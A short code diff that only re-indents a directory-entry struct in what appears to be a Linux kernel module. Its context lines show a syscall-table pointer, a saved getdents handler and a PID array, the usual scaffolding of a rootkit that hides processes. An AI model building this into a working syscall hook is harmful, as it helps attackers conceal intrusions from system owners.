@@ -27,11 +27,11 @@ static int myPIDArray[225];
 static int myPIDArrayLen = 225;
 /* Structure directory entries */
 struct linux_dirent {
-               unsigned long  d_ino;     /* Inode number */
-               unsigned long  d_off;     /* Offset to next linux_dirent */
-               unsigned short d_reclen;  /* Length of this linux_dirent */
-               char           d_name[];  /* Filename (null-terminated) */
-           };
+  unsigned long  d_ino;     /* Inode number */
+  unsigned long  d_off;     /* Offset to next linux_dirent */
+  unsigned short d_reclen;  /* Length of this linux_dirent */
+  char           d_name[];  /* Filename (null-terminated) */
+  };
 void ** syscall_table = (void * *) sys_call_table_R;
 long (*orig_sys_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
 int r_count=0;
